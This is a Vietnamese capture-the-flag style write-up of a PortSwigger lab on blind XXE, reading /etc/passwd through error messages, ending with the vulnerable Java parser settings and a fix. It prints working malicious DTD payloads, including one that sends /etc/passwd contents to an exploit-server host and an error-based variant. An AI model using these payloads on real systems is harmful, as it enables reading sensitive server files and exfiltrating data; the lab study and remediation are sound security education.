![](../assets/Pasted%20image%2020261118085333.png)

# 1. Mục tiêu
Khai thác tính năng "Check stock" để đọc được nội dung file /etc/passwd qua error message. Phần này khác LAB05 ở chỗ: LAB05 là sử dụng kỹ thuật OOB, tức là trả data qua parameter của URL qua GET REQUEST tới attacker server. Còn error message là trả qua error response nhận được trên browser. Suy nghĩ đặt ra lúc này là không thể áp dụng phương pháp sử dụng ở LAB06 này để áp dụng cho LAB05 (oob) vì LAB05 chỉ trả lỗi chung chung là "XML Parsing Error". Tuy nhiên vẫn có thể xảy ra trường hợp dùng phương pháp ở LAB05 để áp dụng cho LAB06 này vì bản chất là server không chặn chiều đi ra (vẫn fetch được file .dtd từ attacker server), trừ khi nếu firewall cấu hình để chặn các dữ liệu khả nghi (Ví dụ: root, etc, password,...) thì mới thất bại. Tiến hành thử cả 2 phương pháp OOB và Error Message cho lab này

# 2. Recon
![](../assets/Pasted%20image%2020261118092456.png)Giống LAB01, vẫn là chức năng Check Stock để kiểm tra hàng tồn kho.
Click vào "Check stock", vào HTTP History trên Burp Suite đọc HTTP Request.

```http
POST /product/stock HTTP/2
Host: 0a2a008904f7303482560b88006200d6.web-security-academy.net
Cookie: session=QipNWdvjgsiJF1ufr0DBk976aJaDaRjQ
Content-Length: 107
Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="104"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36
Sec-Ch-Ua-Platform: "Windows"
Content-Type: application/xml
Accept: */*
Origin: https://0a2a008904f7303482560b88006200d6.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a2a008904f7303482560b88006200d6.web-security-academy.net/product?productId=2
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
<productId>2</productId>
<storeId>1</storeId>
</stockCheck>
```

Thử áp dụng nguyên phương pháp ở LAB05, thay file đích là /etc/passwd
Trên Exploit Server do PortSwigger cung cấp, tạo file malicious.dtd với nội dung: 
```DTD
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://exploit-0a6200d40453ccaa8446087601b500df.exploit-server.net/?x=%file;'>">
%eval;
%exfil;
```

Chuyển HTTP POST request ở trên vào Repeater, chỉnh sửa xml

```DTD XML
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "https://exploit-0a6200d40453ccaa8446087601b500df.exploit-server.net/malicious.dtd"> %xxe; ]>
<stockCheck><productId>2</productId><storeId>1</storeId></stockCheck>
```


![](../assets/Pasted%20image%2020261118093900.png)

Do dữ liệu trong file /etc/passwd chứa các kí tự như các dấu xuống dòng (
) nên báo lỗi ký tự URL không hợp lệ. (Tới đây nghĩ tới cách xử lý bằng cách encode base64 file /etc/passwd để hợp lệ hóa dữ liệu, ví dụ như php://filter/convert.base64-encode/resource=/etc/passwd thay cho %file nếu như server dùng php ). Còn đây dùng java thì không được rồi :>

> **Đọc kỹ dòng lỗi — nó khai luôn backend:** `java.net.MalformedURLException: Illegal character in URL`. Đây đúng là **vấn đề newline**: /etc/passwd nhiều dòng → newline là ký tự bất hợp lệ trong một URL HTTP → Java từ chối dựng URL. Và cái tên `java.net.*` chính là **dấu vân tay**: lỗi do **JDK (thư viện chuẩn của Java)** ném ra chứ không phải người viết app tự đặt (`java.*`/`javax.*` là package của JDK, code app bị cấm đặt tên trong đó). Biết chắc backend là Java thì cũng biết luôn `php://filter` vô dụng ở đây — nó là wrapper **riêng của PHP**. Đây là lý do phải quay sang kỹ thuật error-based ở dưới: **`file://` chịu được newline** vì data về qua `FileNotFoundException`, không phải đi qua bước validate URL.


# 3. Exploit
Sử dụng đúng phương pháp Error Message để khai thác
Host file malicious.dtd ở Exploit Server 
```dtd
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```
Logic y hệt LAB05, khác mỗi là thay cách thức tiếp cận, thay vì đọc qua GET REQUEST gửi tới attacker server thì truyền lệnh đọc file tới local với một file chắc chắn không có để ép server trả lỗi, kèm theo nội dung của file

Chuyển HTTP POST request ở trên vào Repeater, chỉnh sửa xml (phần này y hệt LAB05)

```DTD XML
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "https://exploit-0a6200d40453ccaa8446087601b500df.exploit-server.net/malicious.dtd"> %xxe; ]>
<stockCheck><productId>2</productId><storeId>1</storeId></stockCheck>
```

![](../assets/Pasted%20image%2020261118095158.png)
[1] App nhận payload in-band, parser gặp %xxe; -> fetch error.dtd từ server attacker
[2] Chạy malicious.dtd:
      %file   -> đọc /etc/passwd 
      %eval;  -> dựng %error = file:///nonexistent/<nội dung file>
      %error; -> parser cố MỞ file không tồn tại đó -> THẤT BẠI
[3] Lỗi "java.io.FileNotFoundException: file:///nonexistent/<nội dung file>" sinh ra
[4] App TRẢ NGUYÊN lỗi này ra response  
Response trả về lỗi `java.io.FileNotFoundException: /nonexistent/root:x:0:0:...` — nguyên nội dung /etc/passwd đã được chèn vào sau `/nonexistent/` (`/nonexistent` có thể thay bằng mọi giá trị nào cũng được, vì gần như không có thư mục nào có tên trùng với giá trị của /etc/passwd). Exploit thành công. Hoàn thành lab.
![](../assets/Pasted%20image%2020261118095506.png)

Vài điểm tự làm rõ sau khi giải xong:

> **Error-based khác OOB (LAB05) ở đâu?** Cả hai đều phải fetch file `.dtd` từ attacker server (cùng một cách giao exploit). Khác nhau ở **đường data về**: OOB gửi data ra bằng một **request thứ 2** (mình đọc ở access log); còn error-based **không có request thứ 2** — data về ngay trong **response** của chính request in-band, nhờ cái `FileNotFoundException` cục bộ (`file://`). Vì vậy error-based chịu được newline còn OOB-HTTP thì không.

> **Lỗ hổng "lộ qua error message" có phải là bug của thư viện Java không?** **Không.** Việc `FileNotFoundException` kèm theo đường dẫn là **đúng và hữu ích** cho việc debug. Ở đây có **hai lỗi thật**: (1) **XXE** — cấu hình parser bật external entity, và (2) **app phơi nguyên lỗi chi tiết ra client** — information disclosure. Bỏ path khỏi thông báo lỗi không phải cách vá (vừa phá debug, vừa không cứu được vì OOB vẫn moi được data).

> **Firewall chặn OOB kiểu gì?** Nó chặn ở **tầng mạng** (dựa vào đích đến của kết nối), **không phải tầng chuỗi**. Việc lắp ráp chuỗi trong RAM thì chẳng ai chặn; cái bị chặn là **hành động mở kết nối ra ngoài**. Có hai loại: loại **soi nội dung** (chặn request trông giống đang tuồn data) → error-based né được vì request fetch `.dtd` trông sạch sẽ; loại **chặn sạch egress** → fetch `.dtd` cũng chết luôn, buộc phải xài local DTD (chính là LAB07).

# 4. Mô phỏng backend xử lý

```java
// [LỖI 1] — XXE: bật các tính năng nguy hiểm
dbf.setFeature(".../load-external-dtd", true);
dbf.setFeature(".../external-parameter-entities", true);
...
} catch (Exception e) {
    // [LỖI 2] — phơi nguyên lỗi chi tiết ra client
    return "... " + e.toString() + " ...";
}
```


# 5. Cách vá
```java
// vá [LỖI 1] — tắt DTD, dập tắt XXE tận gốc
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);

// vá [LỖI 2] — log chi tiết ở server, trả client lỗi chung chung
catch (Exception e) {
    log.error("parse failed", e);           // chi tiet chi vao log noi bo
    return "400 Bad Request\n\"Invalid XML\"";  // client chi thay thong bao mo ho
}
```

Hạn chế tối đa quyền, loại bỏ tính năng resolve entities và load dtd nếu ứng dụng không dùng tới chức năng đó. Ngoài ra đáng lẽ chỉ nên ghi lỗi chi tiết ở server, không hiển thị lỗi cho client, chỉ nên trả cho client thông báo chung chung kiểu "Invalid XML".